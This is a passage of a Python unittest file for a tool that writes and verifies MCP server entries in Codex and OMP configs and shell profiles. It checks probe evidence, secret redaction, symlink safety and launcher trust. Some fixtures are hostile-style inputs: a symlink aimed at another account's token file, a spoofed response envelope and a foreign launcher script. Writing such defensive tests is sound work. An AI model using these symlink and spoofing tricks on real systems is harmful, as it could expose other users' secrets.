            rig.tools = PINNED_TOOLS[:-1]
            result = hosts.verify_hosts(scope, package_root=package, probe=True)
            entry = result["hosts"][0]
            checks = entry["host"]["checks"]
            self.assertEqual(checks["protocol"]["status"], "failed")
            self.assertEqual(
                checks["protocol"]["reason"], "protocol-evidence-mismatch"
            )
            self.assertEqual(entry["status"], "fail")

    def test_no_proven_project_root_is_unavailable(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            package = _package(base)
            skills = _skills_root(base, ["alpha-skill"])
            project = base / "project"
            project.mkdir()
            _host, scope = self._aligned_codex(base, runtime, package, skills, project)
            _ProbeRig(self, ["alpha-skill"]).install()

            def refuse(root):
                raise ContractError("scope-conflict", "not a proven project")

            hosts.validate_project = refuse
            result = hosts.verify_hosts(scope, package_root=package, probe=True)
            entry = result["hosts"][0]
            checks = entry["host"]["checks"]
            self.assertEqual(checks["protocol"]["status"], "unavailable")
            self.assertEqual(checks["protocol"]["reason"], "no-proven-project-root")
            self.assertEqual(checks["host_load"]["status"], "unavailable")
            self.assertEqual(entry["status"], "unavailable")

    def test_wrong_server_version_never_passes(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            package = _package(base)
            skills = _skills_root(base, ["alpha-skill"])
            project = base / "project"
            project.mkdir()
            _host, scope = self._aligned_codex(base, runtime, package, skills, project)
            rig = _ProbeRig(self, ["alpha-skill"]).install()
            rig.server_version = "0.0.0-wrong"
            result = hosts.verify_hosts(scope, package_root=package, probe=True)
            entry = result["hosts"][0]
            checks = entry["host"]["checks"]
            self.assertEqual(checks["host_load"]["status"], "failed")
            self.assertEqual(
                checks["host_load"]["reason"], "host-load-evidence-mismatch"
            )
            self.assertEqual(entry["status"], "fail")

    def test_skills_evidence_mismatch_is_failed(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            package = _package(base)
            skills = _skills_root(base, ["alpha-skill"])
            project = base / "project"
            project.mkdir()
            _host, scope = self._aligned_codex(base, runtime, package, skills, project)
            _ProbeRig(self, []).install()
            result = hosts.verify_hosts(scope, package_root=package, probe=True)
            entry = result["hosts"][0]
            checks = entry["host"]["checks"]
            self.assertEqual(checks["skills"]["status"], "failed")
            self.assertEqual(checks["skills"]["reason"], "skills-evidence-mismatch")
            self.assertEqual(entry["status"], "fail")

    def test_probe_fixture_never_carries_user_secrets(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            package = _package(base)
            skills = _skills_root(base, ["alpha-skill"])
            project = base / "project"
            project.mkdir()
            host = _codex_host(
                base, runtime, skills_roots=[skills], project_roots=[project]
            )
            # The live aligned config keeps an unrelated secret-bearing server
            # next to the managed entry.
            before = (
                b"[mcp_servers.other]\n"
                b'command = "/usr/bin/other"\n'
                b"[mcp_servers.other.env]\n"
                + f'API_KEY = "{SECRET}"\n'.encode()
            )
            _write(Path(host["config"]), before)
            scope = {
                "hosts": [host],
                "skills_roots": [str(skills)],
                "decisions": {host["config"]: "replace"},
            }
            resource = hosts.build_host_resources(scope, package_root=package)[0]
            rendered = hosts.render_resource(resource)
            self.assertIn(SECRET.encode("utf-8"), rendered)
            _write(Path(host["config"]), rendered)
            rig = _ProbeRig(self, ["alpha-skill"]).install()
            result = hosts.verify_hosts(scope, package_root=package, probe=True)
            entry = result["hosts"][0]
            self.assertEqual(entry["host"]["checks"]["binding"]["status"], "verified")
            self.assertEqual(entry["status"], "pass")
            self.assertNotIn(SECRET, json.dumps(result))
            self.assertTrue(rig.fixture_configs)
            for config in rig.fixture_configs:
                self.assertNotIn(SECRET.encode("utf-8"), config)

    def test_blocked_resource_fails_checks_without_probing(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            package = _package(base)
            host = _codex_host(base, runtime)
            args = _managed_args(package, runtime) + ["--rogue"]
            _write(Path(host["config"]), _codex_toml(runtime["python"], args))
            scope = {"hosts": [host], "decisions": {host["config"]: "replace"}}
            rig = _ProbeRig(self, []).install()
            result = hosts.verify_hosts(scope, package_root=package, probe=True)
            entry = result["hosts"][0]
            self.assertEqual(entry["disk"]["status"], "blocked")
            checks = entry["host"]["checks"]
            self.assertEqual(checks["binding"]["status"], "failed")
            self.assertEqual(checks["binding"]["reason"], "ownership-conflict")
            self.assertEqual(checks["protocol"]["status"], "failed")
            self.assertEqual(checks["protocol"]["reason"], "resource-blocked")
            self.assertEqual(checks["host_load"]["status"], "failed")
            self.assertEqual(entry["status"], "fail")
            self.assertEqual(rig.spawns, [])

    def test_omp_probe_pass(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            package = _package(base)
            skills = _skills_root(base, ["beta-skill"])
            project = base / "project"
            project.mkdir()
            host = _omp_host(
                base, runtime, skills_roots=[skills], project_roots=[project]
            )
            scope = {"hosts": [host], "skills_roots": [str(skills)]}
            resource = hosts.build_host_resources(scope, package_root=package)[0]
            _write(Path(host["config"]), hosts.render_resource(resource))
            _ProbeRig(self, ["beta-skill"]).install()
            result = hosts.verify_hosts(scope, package_root=package, probe=True)
            entry = result["hosts"][0]
            self.assertEqual(entry["status"], "pass")
            checks = entry["host"]["checks"]
            self.assertEqual(checks["host_load"]["reload"], "session-connect")
            self.assertEqual(checks["host_load"]["status"], "verified")
            self.assertEqual(checks["skills"]["status"], "verified")
            self.assertEqual(checks["skills"]["skills"], ["beta-skill"])
            self.assertNotIn(SECRET, json.dumps(result))

    def test_omp_envelope_must_be_a_successful_matching_response(self) -> None:
        variants = {
            "event-type": lambda envelope: envelope | {"type": "event"},
            "success-absent": lambda envelope: {
                key: value for key, value in envelope.items() if key != "success"
            },
            "success-invalid": lambda envelope: envelope | {"success": "yes"},
            "command-mismatch": lambda envelope: envelope | {"command": "other"},
            # A JSON-RPC-style result must never be promoted over the OMP
            # authoritative data field (omp-data-only-original-red).
            "result-smuggling": lambda envelope: envelope
            | {
                "result": envelope["data"],
                "data": {"systemPrompt": [], "dumpTools": []},
            },
        }
        for label, transform in variants.items():
            with self.subTest(variant=label), tempfile.TemporaryDirectory() as directory:
                base = Path(directory).resolve()
                runtime = _runtime(base)
                package = _package(base)
                skills = _skills_root(base, ["beta-skill"])
                project = base / "project"
                project.mkdir()
                host = _omp_host(
                    base, runtime, skills_roots=[skills], project_roots=[project]
                )
                scope = {"hosts": [host], "skills_roots": [str(skills)]}
                resource = hosts.build_host_resources(scope, package_root=package)[0]
                _write(Path(host["config"]), hosts.render_resource(resource))
                rig = _ProbeRig(self, ["beta-skill"]).install()
                rig.omp_envelope_transform = transform
                # The envelope matches the request id and carries fully shaped
                # pinned tools, yet it is not the strict successful get_state
                # response: its dumpTools must never become registry evidence.
                result = hosts.verify_hosts(scope, package_root=package, probe=True)
                entry = result["hosts"][0]
                self.assertEqual(entry["status"], "fail", entry)
                self.assertEqual(
                    entry["host"]["checks"]["host_load"]["status"], "failed"
                )

    def test_shell_probe_command_resolution(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            package = _package(base)
            profile = base / ".bashrc"
            bin_dir = base / "bin"
            missing_bin = base / "missing-bin"
            scope = {
                "shell_profiles": [
                    {"path": str(profile), "shell": "bash", "bin": str(bin_dir)},
                    {
                        "path": str(base / ".zshrc"),
                        "shell": "zsh",
                        "bin": str(missing_bin),
                    },
                ]
            }
            bin_dir.mkdir()
            _write_graft(bin_dir)
            resources = hosts.build_host_resources(scope, package_root=package)
            for resource in resources:
                _write(Path(resource["target"]), hosts.render_resource(resource))
            result = hosts.verify_hosts(scope, package_root=package, probe=True)
            entries = {entry["shell"]: entry for entry in result["shell_profiles"]}
            self.assertEqual(entries["bash"]["status"], "pass")
            self.assertEqual(
                entries["bash"]["host"]["checks"]["command_resolution"]["status"],
                "verified",
            )
            self.assertEqual(entries["zsh"]["status"], "unavailable")
            self.assertEqual(
                entries["bash"]["host"]["live_reload"],
                {"status": "unverified", "reason": "existing-sessions-not-reloaded"},
            )
            self.assertEqual(
                entries["zsh"]["host"]["checks"]["command_resolution"]["reason"],
                "bin-missing",
            )


class EffectiveHostSafetyTests(unittest.TestCase):
    @unittest.skipIf(os.name == "nt", "POSIX temporary-directory alias scenario")
    def test_owned_probe_fixtures_canonicalize_system_temp_aliases(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            package, runtime = _package(base), _runtime(base)
            skills = _skills_root(base, ["alpha"])
            project = base / "project"
            project.mkdir()
            physical = base / "physical-temporary-parent"
            physical.mkdir(mode=0o700)
            alias = base / "system-temporary-alias"
            alias.symlink_to(physical, target_is_directory=True)
            actual_mkdtemp = tempfile.mkdtemp

            def make_owned_fixture(*args, **kwargs):
                kwargs["dir"] = str(alias)
                return actual_mkdtemp(*args, **kwargs)

            rig = _ProbeRig(self, ["alpha"]).install()
            for builder in (_codex_host, _omp_host):
                with self.subTest(platform=builder.__name__):
                    host = builder(base, runtime, skills_roots=[skills], project_roots=[project])
                    scope = {"hosts": [host], "skills_roots": [str(skills)]}
                    resource = hosts.build_host_resources(scope, package_root=package)[0]
                    _write(Path(host["config"]), hosts.render_resource(resource))
                    with mock.patch.object(hosts.tempfile, "mkdtemp", side_effect=make_owned_fixture):
                        entry = hosts.verify_hosts(scope, package_root=package, probe=True)["hosts"][0]
                    self.assertEqual(entry["status"], "pass", entry)
                    self.assertEqual(entry["host"]["checks"]["host_load"]["status"], "verified")
            for _argv, environment, _cwd in rig.spawns:
                self.assertNotIn(str(alias), environment["TMPDIR"])
                self.assertTrue(Path(environment["TMPDIR"]).is_relative_to(physical))

    def test_selected_project_managed_conflict_blocks_omp(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime, package = _runtime(base), _package(base)
            project = base / "project"
            _write(
                project / ".omp" / "mcp.json",
                b'{"mcpServers":{"sbtd-graft":{"command":"/foreign","args":[]}}}',
            )
            host = _omp_host(base, runtime, project_roots=[project])
            resource = hosts.build_host_resources({"hosts": [host]}, package_root=package)[0]
            self.assertEqual(resource["decision"], "blocked")
            self.assertEqual(resource["details"]["error_code"], "ownership-conflict")
            dependencies = {item["path"] for item in resource["details"]["effective_inputs"]}
            self.assertIn(str(project / ".omp" / "mcp.json"), dependencies)
            self.assertFalse(Path(host["config"]).exists())

    def test_selected_project_source_change_invalidates_render(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime, package = _runtime(base), _package(base)
            project = base / "project"
            project.mkdir()
            host = _omp_host(base, runtime, project_roots=[project])
            resource = hosts.build_host_resources({"hosts": [host]}, package_root=package)[0]
            self.assertEqual(resource["decision"], "install")
            _write(project / ".omp" / "mcp.json", b'{"mcpServers":{}}')
            with self.assertRaises(ContractError) as caught:
                hosts.render_resource(resource)
            self.assertEqual(caught.exception.code, "state-conflict")

    def test_inherited_binding_and_host_projection_preserve_codex_route(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime, package = _runtime(base), _package(base)
            project = base / "project"
            project.mkdir()
            skills = _skills_root(base, ["alpha"])
            host = _omp_host(base, runtime, skills_roots=[skills], project_roots=[project])
            codex = base / "account" / ".codex" / "config.toml"
            _write(codex, _codex_toml(
                runtime["python"], _managed_args(skills / "sbtd-workflow-onboard", runtime)
            ))
            _write(Path(host["config"]).parent / "config.yml", b'enabledProviders: ["codex"]\n')
            scope = {"hosts": [host], "skills_roots": [str(skills)]}
            resource = hosts.build_host_resources(scope, package_root=package)[0]
            self.assertEqual(resource["decision"], "keep")
            self.assertEqual(resource["before"]["type"], "absent")
            rig = _ProbeRig(self, ["alpha"]).install()
            result = hosts.verify_hosts(scope, package_root=package, probe=True)["hosts"][0]
            self.assertEqual(result["status"], "pass")
            binding = result["host"]["checks"]["binding"]
            self.assertEqual(binding["status"], "verified")
            self.assertIn({"source": "codex-user", "name": "sbtd-graft"}, binding["routes"])
            self.assertIn("home/.codex/config.toml", rig.omp_fixture_files)
            self.assertNotIn("agent/mcp.json", rig.omp_fixture_files)
            self.assertIn(b'enabledProviders: ["codex"]', rig.omp_fixture_files["agent/config.yml"])
            self.assertFalse(Path(host["config"]).exists())

    def test_inherited_source_state_is_sealed(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime, package = _runtime(base), _package(base)
            host = _omp_host(base, runtime)
            codex = base / "account" / ".codex" / "config.toml"
            _write(codex, _codex_toml(runtime["python"], _managed_args(package, runtime)))
            _write(Path(host["config"]).parent / "config.yml", b'enabledProviders: ["codex"]\n')
            resource = hosts.build_host_resources({"hosts": [host]}, package_root=package)[0]
            dependencies = {item["path"]: item["state"] for item in resource["details"]["effective_inputs"]}
            self.assertIn(str(codex), dependencies)
            _write(codex, codex.read_bytes() + b"# changed\n")
            with self.assertRaises(ContractError) as caught:
                hosts.render_resource(resource)
            self.assertEqual(caught.exception.code, "state-conflict")

    def test_probe_skill_copy_rejects_root_and_nested_symlinks(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            real = _skills_root(base, ["alpha"])
            private = base / "other-account"
            private.mkdir()
            (private / "token").write_text(SECRET, encoding="utf-8")
            link = base / "linked-skills"
            link.symlink_to(real, target_is_directory=True)
            destination = base / "fixture"
            destination.mkdir(mode=0o700)
            with self.assertRaises(ContractError) as caught:
                hosts._copy_skill_roots([str(link)], destination / "roots")
            self.assertEqual(caught.exception.code, "unsafe-path")
            (real / "private").symlink_to(private, target_is_directory=True)
            with self.assertRaises(ContractError) as caught:
                hosts._copy_skill_roots([str(real)], destination / "roots")
            self.assertEqual(caught.exception.code, "unsafe-path")
            self.assertNotIn(SECRET.encode(), b"".join(_tree_bytes(destination).values()))

    def test_disabled_codex_skill_cannot_pass_host_probe(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime, package = _runtime(base), _package(base)
            skills = _skills_root(base, ["alpha"])
            project = base / "project"
            project.mkdir()
            host = _codex_host(base, runtime, skills_roots=[skills], project_roots=[project])
            scope = {"hosts": [host], "skills_roots": [str(skills)]}
            resource = hosts.build_host_resources(scope, package_root=package)[0]
            _write(Path(host["config"]), hosts.render_resource(resource))
            rig = _ProbeRig(self, ["alpha"]).install()
            rig.codex_skills_enabled = False
            result = hosts.verify_hosts(scope, package_root=package, probe=True)["hosts"][0]
            self.assertEqual(result["status"], "fail")
            self.assertEqual(result["host"]["checks"]["skills"]["status"], "failed")
            self.assertEqual(result["host"]["checks"]["skills"]["skills"], [])

    def test_omp_skill_identities_are_exact_callable_commands(self) -> None:
        entries = [
            {"name": "skill:alpha-extra", "description": "skill:alpha"},
            {"name": "unrelated", "description": "skill://alpha"},
            {"name": "skill:alpha", "enabled": False},
        ]
        self.assertEqual(hosts._omp_skill_names(entries, ["alpha"]), [])
        self.assertEqual(hosts._omp_skill_names([{"uri": "skill://alpha"}], ["alpha"]), ["alpha"])

    def test_omp_similar_skill_command_cannot_pass_host_probe(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime, package = _runtime(base), _package(base)
            skills = _skills_root(base, ["alpha"])
            project = base / "project"
            project.mkdir()
            host = _omp_host(base, runtime, skills_roots=[skills], project_roots=[project])
            scope = {"hosts": [host], "skills_roots": [str(skills)]}
            resource = hosts.build_host_resources(scope, package_root=package)[0]
            _write(Path(host["config"]), hosts.render_resource(resource))
            rig = _ProbeRig(self, ["alpha"]).install()
            rig.omp_commands = [{"name": "skill:alpha-extra", "description": "skill:alpha"}]
            result = hosts.verify_hosts(scope, package_root=package, probe=True)["hosts"][0]
            self.assertEqual(result["status"], "fail")
            self.assertEqual(result["host"]["checks"]["skills"]["status"], "failed")

    def test_untrusted_protocol_mismatch_strings_are_redacted(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime, package = _runtime(base), _package(base)
            project = base / "project"
            project.mkdir()
            host = _codex_host(base, runtime, project_roots=[project])
            scope = {"hosts": [host]}
            resource = hosts.build_host_resources(scope, package_root=package)[0]
            _write(Path(host["config"]), hosts.render_resource(resource))
            rig = _ProbeRig(self, []).install()
            rig.tools = PINNED_TOOLS + [SECRET]
            rig.server_version = SECRET
            result = hosts.verify_hosts(scope, package_root=package, probe=True)
            self.assertEqual(result["hosts"][0]["status"], "fail")
            self.assertNotIn(SECRET, json.dumps(result))


class ProbeFixturePrivacyTests(unittest.TestCase):
    def test_skill_copy_destination_is_proven_private_at_creation(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            skills = _skills_root(base, ["alpha"])
            # The parent is a plain directory on purpose: privacy must come
            # from the destination creation itself, never from the caller's
            # chmod or from inherited defaults.
            parent = base / "fixture"
            parent.mkdir()
            destinations = parent / "roots"
            copies = hosts._copy_skill_roots([str(skills)], destinations)
            self.assertEqual(copies, [str(destinations / "0")])
            self.assertEqual(
                sorted(child.name for child in (destinations / "0").iterdir()),
                ["alpha", "sbtd-workflow-onboard"],
            )
            # Proof, not assumption: the migration primitive re-verifies the
            # destination (POSIX mode/ownership, Windows ACL) on every platform.
            self.assertEqual(require_private_directory(destinations), destinations)

    def test_skill_copy_destination_that_cannot_be_privatized_fails_closed(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            skills = _skills_root(base, ["alpha"])
            blocker = base / "blocked"
            blocker.write_bytes(b"not a directory")
            # A supplied path that can never be a private directory is refused
            # with a real reason; it is never repaired or replaced.
            with self.assertRaises(ContractError) as caught:
                hosts._copy_skill_roots([str(skills)], blocker)
            self.assertEqual(caught.exception.code, "privacy-unproven")
            self.assertEqual(blocker.read_bytes(), b"not a directory")


class InstalledLauncherBindingTests(unittest.TestCase):
    def test_missing_selected_installation_is_plannable_not_source_bound(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            package, runtime = _package(base), _runtime(base)
            selected = base / "selected-skills"
            selected.mkdir()
            host = _codex_host(base, runtime, skills_roots=[selected])
            resource = hosts.build_host_resources(
                {"hosts": [host], "skills_roots": [str(selected)]}, package_root=package
            )[0]
            self.assertEqual(resource["decision"], "install")
            launcher = resource["details"]["launcher"]
            self.assertEqual(launcher["path"], str(selected / "sbtd-workflow-onboard/scripts/sbtd_graft_entry.py"))
            self.assertEqual(launcher["state"]["type"], "absent")
            with self.assertRaises(ContractError) as caught:
                hosts.render_resource(resource)
            self.assertEqual(caught.exception.code, "runtime-unavailable")
            _write(Path(launcher["path"]), (package / "scripts/sbtd_graft_entry.py").read_bytes())
            rendered = hosts.render_resource(resource)
            command, args = _rendered_record(rendered)
            self.assertEqual(command, runtime["python"])
            self.assertEqual(
                args, _managed_args(selected / "sbtd-workflow-onboard", runtime)
            )
            self.assertNotIn(str(package), " ".join([command, *args]))

    def test_installed_real_launcher_remains_runnable_after_stage_removed(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            stage = base / "executor-stage"
            scripts = stage / "scripts"
            scripts.mkdir(parents=True)
            for module in SCRIPTS.glob("*.py"):
                (scripts / module.name).write_bytes(module.read_bytes())
            runtime = _runtime(base)
            selected = base / "selected-skills"
            selected.mkdir()
            host = _codex_host(base, runtime, skills_roots=[selected])
            resource = hosts.build_host_resources(
                {"hosts": [host], "skills_roots": [str(selected)]}, package_root=stage
            )[0]
            installed = selected / "sbtd-workflow-onboard"
            shutil.copytree(stage, installed)
            rendered = hosts.render_resource(resource)
            command, args = _rendered_record(rendered)
            self.assertEqual(command, runtime["python"])
            self.assertEqual(args, _managed_args(installed, runtime))
            self.assertNotIn(str(stage), " ".join([command, *args]))
            shutil.rmtree(stage)
            isolated = base / "isolated-home"
            isolated.mkdir()
            result = subprocess.run(
                [sys.executable, "-E", "-s", str(installed / "scripts/sbtd_graft_entry.py"), "--help"],
                env={
                    "HOME": str(isolated),
                    "USERPROFILE": str(isolated),
                    "PATH": os.defpath,
                    **{
                        name: os.environ[name]
                        for name in ("SystemRoot", "COMSPEC")
                        if name in os.environ
                    },
                },
                cwd=base, capture_output=True, timeout=15, check=False,
            )
            self.assertEqual(result.returncode, 0, result.stderr.decode(errors="replace"))
            self.assertIn(b"sbtd-graft-entry", result.stdout)

    def test_multiple_selected_roots_need_explicit_onboard_root(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            package, runtime = _package(base), _runtime(base)
            first = _skills_root(base, ["alpha"], dirname="first")
            second = _skills_root(base, ["beta"], dirname="second")
            host = _codex_host(base, runtime, skills_roots=[first, second])
            scope = {"hosts": [host], "skills_roots": [str(first), str(second)]}
            with self.assertRaises(ContractError) as caught:
                hosts.build_host_resources(scope, package_root=package)
            self.assertEqual(caught.exception.code, "scope-conflict")
            host["onboard_root"] = str(second / "sbtd-workflow-onboard")
            resource = hosts.build_host_resources(scope, package_root=package)[0]
            rendered = hosts.render_resource(resource)
            command, args = _rendered_record(rendered)
            self.assertEqual(command, runtime["python"])
            self.assertEqual(
                args, _managed_args(second / "sbtd-workflow-onboard", runtime)
            )
            self.assertNotIn(str(first), " ".join([command, *args]))

    def test_host_only_foreign_launcher_payload_is_not_trusted(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            package, runtime = _package(base), _runtime(base)
            host = _codex_host(base, runtime)
            foreign = base / "foreign-installation"
            _write(foreign / "scripts/sbtd_graft_entry.py", b"print('foreign user code')\n")
            host["onboard_root"] = str(foreign)
            resource = hosts.build_host_resources({"hosts": [host]}, package_root=package)[0]
            self.assertEqual(resource["decision"], "blocked")
            self.assertEqual(resource["details"]["error_code"], "untrusted-onboard-installation")

    def test_host_only_matching_launcher_with_foreign_import_is_not_trusted(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            package, runtime = _package(base), _runtime(base)
            _write(package / "scripts/support.py", b"# trusted support\n")
            installed = base / "installed-copy"
            shutil.copytree(package, installed)
            _write(installed / "scripts/support.py", b"# replaced imported user code\n")
            host = _codex_host(base, runtime)
            host["onboard_root"] = str(installed)
            resource = hosts.build_host_resources({"hosts": [host]}, package_root=package)[0]
            self.assertEqual(resource["decision"], "blocked")
            self.assertEqual(resource["details"]["error_code"], "untrusted-onboard-installation")


class RealShellResolutionTests(unittest.TestCase):
    def _profile(self, base: Path, before: bytes = b"", shell: str = "bash"):
        profile, bin_dir = base / "selected-profile", base / "bin"
        bin_dir.mkdir()
        if before:
            _write(profile, before)
        scope = {
            "shell_profiles": [{"path": str(profile), "shell": shell, "bin": str(bin_dir)}],
            "decisions": {str(profile): "replace"},
        }
        resource = hosts.build_host_resources(scope, package_root=_package(base))[0]
        _write(profile, hosts.render_resource(resource))
        return scope, bin_dir

    @unittest.skipUnless(shutil.which("bash"), "bash unavailable")
    def test_empty_bin_directory_does_not_prove_command_resolution(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            scope, _bin = self._profile(base)
            entry = hosts.verify_hosts(scope, package_root=base / "package", probe=True)["shell_profiles"][0]
            self.assertEqual(entry["status"], "fail")
            self.assertEqual(entry["host"]["checks"]["command_resolution"]["reason"], "graft-not-resolved")

    @unittest.skipUnless(shutil.which("bash"), "bash unavailable")
    def test_selected_profile_parse_and_resolution_after_nvm(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            scope, bin_dir = self._profile(base, b'export NVM_DIR="/isolated-nvm"\nexport PATH="/nowhere"\n')
            _write_graft(bin_dir)
            entry = hosts.verify_hosts(scope, package_root=base / "package", probe=True)["shell_profiles"][0]
            self.assertEqual(entry["status"], "pass")
            check = entry["host"]["checks"]["command_resolution"]
            self.assertEqual(check["command"], "graft")
            self.assertEqual(check["evidence_scope"], "isolated-shell/selected-profile")

    @unittest.skipUnless(shutil.which("bash"), "bash unavailable")
    def test_profile_syntax_error_is_failed(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            scope, _bin = self._profile(base, b'if then\n')
            entry = hosts.verify_hosts(scope, package_root=base / "package", probe=True)["shell_profiles"][0]
            self.assertEqual(entry["status"], "fail")
            self.assertEqual(entry["host"]["checks"]["command_resolution"]["reason"], "profile-syntax-invalid")

    @unittest.skipUnless(shutil.which("zsh"), "zsh unavailable")
    def test_zsh_selected_profile_resolves_actual_graft(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            scope, bin_dir = self._profile(base, shell="zsh")
            _write_graft(bin_dir)
            entry = hosts.verify_hosts(scope, package_root=base / "package", probe=True)["shell_profiles"][0]
            self.assertEqual(entry["status"], "pass")


class SelectedExecutableIdentityTests(unittest.TestCase):
    @unittest.skipUnless(shutil.which("bash") and os.name != "nt", "POSIX bash unavailable")
    def test_npm_symlink_supported_without_scanning_unselected_bin_siblings(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            package = _package(base)
            bin_dir = base / "bin"
            bin_dir.mkdir()
            cli = base / "package-runtime" / "cli.js"
            _write(cli, b"#!/bin/sh\nexit 0\n")
            cli.chmod(0o755)
            (bin_dir / "graft").symlink_to(cli)
            # An unrelated link is neither followed nor snapshotted.
            (bin_dir / "unselected").symlink_to(base / "does-not-exist")
            profile = base / "selected-profile"
            scope = {"shell_profiles": [{"path": str(profile), "shell": "bash", "bin": str(bin_dir)}]}
            resource = hosts.build_host_resources(scope, package_root=package)[0]
            identity = resource["details"]["command_identity"]
            self.assertEqual(identity["resolved"], str(cli))
            _write(profile, hosts.render_resource(resource))
            entry = hosts.verify_hosts(scope, package_root=package, probe=True)["shell_profiles"][0]
            self.assertEqual(entry["status"], "pass")
            self.assertEqual(entry["host"]["checks"]["command_resolution"]["runtime_binding"], "not-selected")

    def test_selected_executable_drift_invalidates_render(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            package = _package(base)
            bin_dir = base / "bin"
            bin_dir.mkdir()
            executable = bin_dir / "graft"
            executable.write_bytes(b"before")
            profile = base / "selected-profile"
            scope = {"shell_profiles": [{"path": str(profile), "shell": "bash", "bin": str(bin_dir)}]}
            resource = hosts.build_host_resources(scope, package_root=package)[0]
            executable.write_bytes(b"after")
            with self.assertRaises(ContractError) as caught:
                hosts.render_resource(resource)
            self.assertEqual(caught.exception.code, "state-conflict")

    @unittest.skipUnless(shutil.which("bash") and os.name != "nt", "POSIX bash unavailable")
    def test_shell_resolution_must_match_selected_host_cli(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            package, runtime = _package(base), _runtime(base)
            host = _codex_host(base, runtime)
            bin_dir = base / "bin"
            bin_dir.mkdir()
            other_cli = base / "other-cli.js"
            other_cli.write_bytes(b"#!/bin/sh\nexit 0\n")
            other_cli.chmod(0o755)
            (bin_dir / "graft").symlink_to(other_cli)
            profile = base / "selected-profile"
            scope = {
                "hosts": [host],
                "shell_profiles": [{"path": str(profile), "shell": "bash", "bin": str(bin_dir)}],
            }
            resource = next(
                item for item in hosts.build_host_resources(scope, package_root=package)
                if item["kind"] == "shell"
            )
            _write(profile, hosts.render_resource(resource))
            check = hosts._shell_resolution(scope["shell_profiles"][0], resource["details"])
            self.assertEqual(check["status"], "failed")
            self.assertEqual(check["reason"], "graft-runtime-binding-mismatch")

    @unittest.skipUnless(shutil.which("bash") and os.name != "nt", "POSIX bash unavailable")
    def test_recognized_shim_through_selected_symlink_is_not_bound(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            package, runtime = _package(base), _runtime(base)
            host = _codex_host(base, runtime)
            cli = _npm_package_cli(base)
            runtime["cli"] = str(cli)
            actual = base / "actual-bin"
            _npm_shims(actual)
            bin_dir = base / "bin"
            bin_dir.mkdir()
            # npm links bin/graft to the package wrapper, and the wrapper
            # computes basedir from the INVOKED path ($0 / %~dp0): a binding
            # derived from the resolved wrapper's parent proves the wrong cli
            # location, so a recognized shim behind a symlink is refused.
            (bin_dir / "graft").symlink_to(actual / "graft")
            profile = base / "selected-profile"
            scope = {
                "hosts": [host],
                "shell_profiles": [
                    {"path": str(profile), "shell": "bash", "bin": str(bin_dir)}
                ],
            }
            resource = next(
                item
                for item in hosts.build_host_resources(scope, package_root=package)
                if item["kind"] == "shell"
            )
            identity = resource["details"]["command_identity"]
            self.assertIsNone(identity.get("shim"))
            _write(profile, hosts.render_resource(resource))
            check = hosts._shell_resolution(
                scope["shell_profiles"][0], resource["details"]
            )
            self.assertEqual(check["status"], "failed")
            self.assertEqual(check["reason"], "graft-runtime-binding-mismatch")


class NativeWindowsBoundaryTests(unittest.TestCase):
    """Native Windows process environment stays explicit and private."""

    def test_legacy_selected_bin_matches_git_bash_alias(self):
        raw = (b'export PATH="/c/Users/me/bin:$PATH"\nexport PATH="/c/other/bin:$PATH"\n'
               b'export PATH="/c/Users/me/bin-extra:$PATH"\n'
               b'export PATH="/c/Users/me/bin/nested:$PATH"\n'
               b'path=(/c/Users/me/bin $path)\npath+=(/c/Users/me/bin)\n')
        self.assertEqual(hosts._shell_legacy_lines(raw, r"C:\Users\me\bin"), [1, 5, 6])

    @unittest.skipUnless(os.name == "nt", "native Windows selected path")
    def test_git_bash_legacy_alias_is_reported_by_public_verification(self):
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            profile, bin_dir = base / ".bashrc", base / "bin"
            before = f'export PATH="{hosts._posix_shell_path(str(bin_dir))}:$PATH"\n'.encode()
            _write(profile, before)
